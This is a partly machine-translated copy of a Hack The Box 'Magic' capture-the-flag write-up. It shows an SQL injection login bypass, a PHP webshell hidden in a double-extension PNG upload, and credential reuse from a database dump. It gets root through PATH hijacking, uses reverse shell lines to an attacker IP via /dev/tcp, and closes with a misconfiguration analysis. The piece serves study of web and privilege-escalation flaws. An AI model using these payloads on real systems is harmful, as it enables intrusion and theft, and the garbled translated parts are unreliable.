登录的SQLI，另一个是带有双重扩展名的Webshell上传以绕过过滤
并在数据库中找到凭证以切换到用户。
root，有一个二进制文件调用没有完整路径的 sysinfo  + popen
# 高温透射细胞：魔法

[0xdf.gitlab.io](https://0xdf.gitlab.io/2020/08/22/htb-magic.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fmagic-cover.) 

Magic有两个常见的步骤，一个是用于绕过登录的SQLI，另一个是带有双重扩展名的Webshell上传以绕过过滤。从那里我可以得到一个shell，并在数据库中找到信誉以切换到用户。要获得root，有一个二进制文件调用没有完整路径的popen，这使得它容易受到路径劫持攻击。在超越根中，我将介绍导致执行.php.png文件的Apache配置，过滤上传的PHP代码以及suid二进制文件的源代码。

## 箱子信息

名字

[魔法](https://www.hackthebox.eu/home/machines/profile/241) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-magic.png) 

发行日期

[18 4月 2020](https://twitter.com/hackthebox_eu/status/1250771019868057603)

停用日期

22 8月 2020

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

中等 \[30\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fmagic-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fmagic-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 00小时 18分31秒。[![变形3](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F51398)](https://www.hackthebox.eu/home/users/profile/51398)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 00小时 32分 48秒。[![信息安全杰克](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F52045)](https://www.hackthebox.eu/home/users/profile/52045)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F31190)](https://www.hackthebox.eu/home/users/profile/31190)-

## 侦察

### n地图

`nmap`仅显示两个 TCP 端口，即固态混合端口 （22） 和 HTTP （80）：

    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.185
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-18 15:01 EDT
    Nmap scan report for 10.10.10.185
    Host is up (0.013s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 7.79 seconds
    root@kali# nmap -p 22,80 -sV -sC -oA scans/nmap-tcpscripts 10.10.10.185
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-18 15:01 EDT
    Nmap scan report for 10.10.10.185
    Host is up (0.014s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
    |   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
    |_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Magic Portfolio
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.56 seconds
    

基于[阿帕奇](https://packages.ubuntu.com/search?keywords=apache2)和[开放SSH](https://packages.ubuntu.com/search?keywords=openssh-server)版本，这看起来像Ubuntu 18.04仿生。

### 网站 - TCP 80

#### 网站

该网站是一个图像托管网站：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200419134553262.png) 

在底部，它说“请登录，上传图像。

#### SQLi 登录旁路

单击“登录”将转到 ，其中包含一个简单的登录表单：`/login.php`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200419134641200.png) 

我尝试了一些基本的登录，如管理员/管理员和魔术/魔术，但没有运气。我尝试了一个基本的SQLi登录绕过用户名，它让我登录。`' or 1=1-- -`

这是有效的，因为网站必须执行如下操作：

    SELECT * from users where username = '$username' and password = '$password';
    

因此，我的输入使得：

    SELECT * from users where username = '' or 1=1-- -and password = 'admin';
    

That must satisfy the site’s logic, as it allows me in.

#### /upload.php

On successful login, the browser is redirected to :`/upload.php`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200419103136668.png) 

If I try to upload , it returns:`shell.php`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200419103214741.png) 

If I try to upload a PHP webshell named , it responds:`shell.jpg`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200419103320448.png) 

If I upload a legitimate image file, at the top left, it reports it’s been uploaded:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200419134848846.png) 

Back on , my image is there:`/index.php`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200419134922377.png) 

我可以查看图像的位置，即 。`/images/uploads/[name I submitted]`

#### 目录暴力破解

`gobuster`没有显示我没有看到的任何内容，只是环顾网站：

    root@kali# gobuster dir -u http://10.10.10.185/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -o scans/gobuster-root-medium-php
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.185/
    [+] Threads:        10
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     php
    [+] Timeout:        10s
    ===============================================================
    2020/04/18 15:04:10 Starting gobuster
    ===============================================================
    /images (Status: 301)
    /index.php (Status: 200)
    /login.php (Status: 200)
    /assets (Status: 301)
    /upload.php (Status: 302)
    /logout.php (Status: 302)
    /server-status (Status: 403)
    ===============================================================
    2020/04/18 15:14:01 Finished
    ===============================================================
    

## 壳牌作为万维数据

### 上传网络外壳

#### 旁路过滤器

为了检查上传时的过滤器，我喜欢找到在Burp中上传合法图像文件的POST请求，并将其发送到中继器。在确保它成功提交后，我将开始更改内容以查看其中断位置。网站通常对此类上传进行三项检查：

*   文件扩展名阻止/允许列表;
*   文件的 MIMETYPE 或[魔术字节](https://en.wikipedia.org/wiki/List_of_file_signatures)必须与允许的类型匹配;
*   `Content-Type`图像上的标题必须是图像。

一些测试表明，上传时至少应用了两个过滤器：文件名必须以 、 或 结尾，并且图像的 mimetype 传递。`.jpg``.jpeg``.png`

通过将PHP代码放在有效图像的中间，可以绕过第二个过滤器。

我将创建我的图像的副本并将其命名为 。然后，我将打开它，并在文件中间添加一个简单的PHP网页外壳：`avatar-mod.png``vim`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200419140056407.png) 

该文件以PNG的合法魔术字节开头，但我已将网络外壳添加到文件的中间。此文件上传没有问题。

#### 获得执行力

这里仍然存在一个问题。我需要一些方法来让网站像PHP一样对待这个文件（从而执行它），而不是像图像一样。通常，这是通过扩展完成的。如果网站阻止说这是不允许的，我会尝试像，和。但是，由于错误消息表明存在三个图像文件扩展名的白名单，因此这似乎不太可能。`.php``.php5``.phtml`

One thing worth trying is putting in the file name, just not at the end. This won’t execute on a well configured server, but there are misconfigurations that might allow it.`.php`

I’ll create a copy of just the plain image file and name it . When I upload that, it is broken on the main page, and when I view it directly in , it shows the text of the file, not the image:`test.php.png``/images/uploads`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200419140552707.png) 

I’ll look at why the webserver is treating that file that way in Beyond Root, but seeing this handled as PHP and not an image is enough for me to move forward. I’ll rename my image with a PHP webshell in it to and upload it. When I visit , I can see the execution in the middle of the page:`avatar.php.png``http://10.10.10.185/images/uploads/avatar.php.png?cmd=id`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200419140725925.png) 

### Shell

To get a shell from here, I just need to pass in a reverse shell. Visiting works:`http://10.10.10.185/images/uploads/avatar.php.png?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.20/443 0>%261'`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.185.
    Ncat: Connection from 10.10.10.185:53650.
    bash: cannot set terminal process group (1140): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@ubuntu:/var/www/Magic/images/uploads$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

## Priv: www-data –> theseus

### Enumeration

Looking at the home directories, there’s one user, theseus, and as www-data I can see but not read it:`user.txt`

    www-data@ubuntu:/home$ ls
    theseus
    www-data@ubuntu:/home/theseus$ ls
    Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  testing  user.txt
    

Enumerating as www-data didn’t turn out anything obvious, so I went into the web configurations to see what I could find. The site is hosted out of :`/var/www/Magic`

    www-data@ubuntu:/var/www/Magic$ ls
    assets  db.php5  images  index.php  login.php  logout.php  upload.php
    

`db.php5` does have creds for the database:

    <?php
    class Database
    {
        private static $dbName = 'Magic' ;
        private static $dbHost = 'localhost' ;
        private static $dbUsername = 'theseus';
        private static $dbUserPassword = 'iamkingtheseus';
    
        private static $cont  = null;
    
        public function __construct() {
            die('Init function is not allowed');
        }
    
        public static function connect()
        {
            // One connection through whole application
            if ( null == self::$cont )
            {
                try
                {
                    self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
                }
                catch(PDOException $e)
                {
                    die($e->getMessage());
                }
            }
            return self::$cont;
        }
    
        public static function disconnect()
        {
            self::$cont = null;
        }
    }
    

### Database Dump

Unfortunately, , the binary I would typically use to connect to the local port and interrogate the DB, isn’t on the box. This is a case where having a full PTY shell on the box paid off, because when I typed , it gave a list of things that were on the box:`mysql``mys[tab][tab][tab]`


```mysql

    www-data@ubuntu:/var/www/Magic$ mysql
    mysql_config_editor        mysql_secure_installation  mysqladmin                 mysqld                     mysqldumpslow              mysqlrepair
    mysql_embedded             mysql_ssl_rsa_setup        mysqlanalyze               mysqld_multi               mysqlimport                mysqlreport
    mysql_install_db           mysql_tzinfo_to_sql        mysqlbinlog                mysqld_safe                mysqloptimize              mysqlshow
    mysql_plugin               mysql_upgrade              mysqlcheck                 mysqldump                  mysqlpump                  mysqlslap
```

    

It would have been not that hard to upload [Chisel](https://github.com/jpillora/chisel) and create a tunnel from my host to the MySQL port (3306) listening on localhost on Magic, but jumped out as an alternative. Once I figured out the syntax, it worked like a charm:`mysqldump`

    www-data@ubuntu:/$ mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
    mysqldump: [Warning] Using a password on the command line interface can be insecure.              
    -- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)                                           
    --                                               
    -- Host: localhost    Database: Magic                                                             
    -- ------------------------------------------------------                             
    -- Server version       5.7.29-0ubuntu0.18.04.1                                       
    
    /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;                                 
    /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;                               
    /*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;                                 
    /*!40101 SET NAMES utf8 */;              
    /*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
    /*!40103 SET TIME_ZONE='+00:00' */;              
    /*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
    /*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
    /*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
    /*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
    
    --                                                       
    -- Table structure for table `login`                     
    --                                                       
                                                             
    DROP TABLE IF EXISTS `login`;                            
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!40101 SET character_set_client = utf8 */;
    CREATE TABLE `login` (                                   
      `id` int(6) NOT NULL AUTO_INCREMENT,                   
      `username` varchar(50) NOT NULL,                       
      `password` varchar(100) NOT NULL,                      
      PRIMARY KEY (`id`),                                    
      UNIQUE KEY `username` (`username`)                     
    ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `login`
    --
    
    LOCK TABLES `login` WRITE;
    /*!40000 ALTER TABLE `login` DISABLE KEYS */;
    INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
    /*!40000 ALTER TABLE `login` ENABLE KEYS */;
    UNLOCK TABLES;                                           
    /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
    /*!40101 SET SQL_MODE=@OLD_SQL_MODE */;                  
    /*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
    /*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
    /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
    /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
    /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
    /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;                
    -- Dump completed on 2020-04-19 11:21:47
    

This tool dumps out SQL such that all the commands are here to rebuild this database. There’s one statement for the table:`INSERT``login`

    INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
    

### su

These creds do work to login without SQLi on the webpage, but they also work for to theseus:`su`

    www-data@ubuntu:/home/theseus$ su - theseus
    Password: 
    theseus@ubuntu:~$
    

And from there I can grab :`user.txt`

    theseus@ubuntu:~$ cat user.txt
    65e8f262************************
    

## Priv: theseus –> root

### Enumeration

Any enumeration script will highlight SUID binaries, or I can find files owned by root with SUID set using :`find`

    www-data@ubuntu:/$ find / -user root -type f -perm -4000  -ls 2>/dev/null
    ...[snip]...
       393232     24 -rwsr-x---   1 root     users              22040 Oct 21  2019 /bin/sysinfo
    ...[snip]...
    

`/bin/sysinfo` is new to me, so I’ll check it out. It’s also interesting that only members of the group can execute it, and theseus is the only member of that group:`users`

    www-data@ubuntu:/$ cat /etc/group | grep users
    users:x:100:theseus
    

I can run the binary, and it prints out a bunch of information about the system:

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fmagic-sysinfo.gif)_Click for full size image_](https://0xdf.gitlab.io/img/magic-sysinfo.gif)

### ltrace

Running with prints out the calls made outside the binary. There’s a ton of output, but looking through it, there’s a line that jumps out at me:`sysinfo``ltrace`

    theseus@ubuntu:/$ ltrace sysinfo
    ...[snip]...
    popen("fdisk -l", "r")                           = 0x55e43e4e9280                 
    fgets(fdisk: cannot open /dev/loop0: Permission denied
    fdisk: cannot open /dev/loop1: Permission denied
    fdisk: cannot open /dev/loop2: Permission denied
    fdisk: cannot open /dev/loop3: Permission denied                                                   
    fdisk: cannot open /dev/loop4: Permission denied
    ...[snip]...
    

`popen` is another way to [open a process](https://man7.org/linux/man-pages/man3/popen.3.html) on Linux. The binary is making a call to , which is fine, except that it is doing so without specifying the full path. This leave the binary vulnerable to path hijacking.`fdisk`

### Shell

I’ll create a reverse shell script in :`/dev/shm`

    theseus@ubuntu:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.20/443 0>&1'
    #!/bin/bash
    
    bash -i >& /dev/tcp/10.10.14.20/443 0>&1
    theseus@ubuntu:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.20/443 0>&1' > fdisk
    theseus@ubuntu:/dev/shm$ chmod +x fdisk 
    

I’ll test it and make sure it connects, and it does:

    theseus@ubuntu:/dev/shm$ ./fdisk
    

Now I’ll update my current path to include :`/dev/shm`

    theseus@ubuntu:/dev/shm$ echo $PATH
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
    theseus@ubuntu:/dev/shm$ export PATH="/dev/shm:$PATH"
    theseus@ubuntu:/dev/shm$ echo $PATH                  
    /dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
    

Now when I run , when it gets to the call, I get a shell at my listener:`sysinfo``fdisk``nc`

    theseus@ubuntu:/dev/shm$ sysinfo                                                                   
    ====================Hardware Info====================          
    H/W path           Device      Class      Description                                              
    =====================================================          
                                   system     VMware Virtual Platform
    /0                             bus        440BX Desktop Reference Platform
    ...[snip]...
    /0/46/0.0.0        /dev/cdrom  disk       VMware IDE CDR00
    /1                             system     
    
    ====================Disk Info====================
    
    

At :`nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.185.
    Ncat: Connection from 10.10.10.185:58406.
    root@ubuntu:/dev/shm# id
    uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
    

And I can grab :`root.txt`

    root@ubuntu:/# cat /root/root.txt
    3f3721ee************************
    

## Beyond Root

### FilesMatch

One of the things to verify was why was handled by the webserver as PHP code and not as an image. [Networked](https://0xdf.gitlab.io/2019/11/16/htb-networked.html#beyond-root---php-misconfiguration) had a similar issue.`test.php.png`

I started in the directory, and found enabled:`/etc/apache2``php7.3.conf`

    www-data@ubuntu:/etc/apache2$ ls -l mods-enabled/php7.3.conf 
    lrwxrwxrwx 1 root root 29 Oct 18  2019 mods-enabled/php7.3.conf -> ../mods-available/php7.3.conf
    

Looking in that file, there’s the directive for how PHP files are handled:

    <FilesMatch ".+\.ph(ar|p|tml)$">
        SetHandler application/x-httpd-php
    </FilesMatch>
    

Strangely, that looks fine. There’s a trailing on the string, which means the file has to end with the string. So how did my upload execute?`$``FilesMatch`

The answer is that there’s an file in the web directory:`.htaccess`

    www-data@ubuntu:/var/www/Magic$ ls -la .htaccess 
    -rwx---r-x 1 www-data www-data 162 Oct 18  2019 .htaccess
    

This file overrides the config on how PHP files are handled:

    <FilesMatch ".+\.ph(p([3457s]|\-s)?|t|tml)">
    SetHandler application/x-httpd-php
    </FilesMatch>
    <Files ~ "\.(sh|sql)">
       order deny,allow
       deny from all
    

This regex doesn’t have the trailing , which means it will match is is anywhere in the string.`$``.php`

### Upload Filters

I also wanted to take a look at the source code for for to see what filtering was happening on uploads. There are three checks in the code, but one of them is commented out:`upload.php`

    $allowed = array('2', '3');                                                                               
    ...[snip]...
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));                                                                                            
    if ($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg") {                                                                               
        echo "<script>alert('Sorry, only JPG, JPEG & PNG files are allowed.')</script>";
        $uploadOk = 0;                    
    }
    
    if ($uploadOk === 1) {
        // Check if image is actually png or jpg using magic bytes
        $check = exif_imagetype($_FILES["image"]["tmp_name"]);
        if (!in_array($check, $allowed)) { 
            echo "<script>alert('What are you trying to do there?')</script>";
            $uploadOk = 0;
        }
    }
    //Check file contents
    /*$image = file_get_contents($_FILES["image"]["tmp_name"]);
        if (strpos($image, "<?") !== FALSE) {
            echo "<script>alert('Detected \"\<\?\". PHP is not allowed!')</script>";
            $uploadOk = 0;
        }*/
    

The first one gets the extension from the uploaded file, and checks that it is , , or .`jpg``jpeg``png`

The second one gets the Mimetype using . According to the [PHP manual](https://www.php.net/manual/en/function.exif-imagetype.php), this will:`exif_imagetype`

> **exif\_imagetype()** reads the first bytes of an image and checks its signature.
> 
> When a correct signature is found, the appropriate constant value will be returned otherwise the return value is **`FALSE`**.

The two return values of interest here are (2) and (3), which show up in .`IMAGETYPE_JPEG``IMAGETYPE_JPNG``$allowed`

The third check is commented out, but would have made this very difficult. It checks if is in the file at all, and rejects it if so. I would think this could be very false positive prone, as those two bytes could easily show up as color values. Perhaps that’s why it’s commented out.`<?`

### sysinfo Source

I was planning to reverse enginner , but in there’s a file:`sysinfo``/root``info.c`

    #include <unistd.h>
    #include <iostream>
    #include <cassert>
    #include <cstdio>
    #include <iostream>
    #include <memory>
    #include <stdexcept>
    #include <string>
    #include <array>
    
    using namespace std;
    
    std::string exec(const char* cmd) {
        std::array<char, 128> buffer;
        std::string result;
        std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
        if (!pipe) {
            throw std::runtime_error("popen() failed!");
        }
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            result += buffer.data();
        }
        return result;
    }
    
    int main() {
        setuid(0);
        setgid(0);
        cout << "====================Hardware Info====================" << endl;
        cout << exec("lshw -short") << endl;
        cout << "====================Disk Info====================" << endl;
        cout << exec("fdisk -l") << endl;
        cout << "====================CPU Info====================" << endl;
        cout << exec("cat /proc/cpuinfo") << endl;
        cout << "====================MEM Usage=====================" << endl;
        cout << exec("free -h");
        return(0);
    }
    

This code makes a series of calls to various functions, all without full paths. I could have impersonated any of , , , or to get execution.`lshw``fdisk``cat``free`

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2020/08/22/htb-magic.html)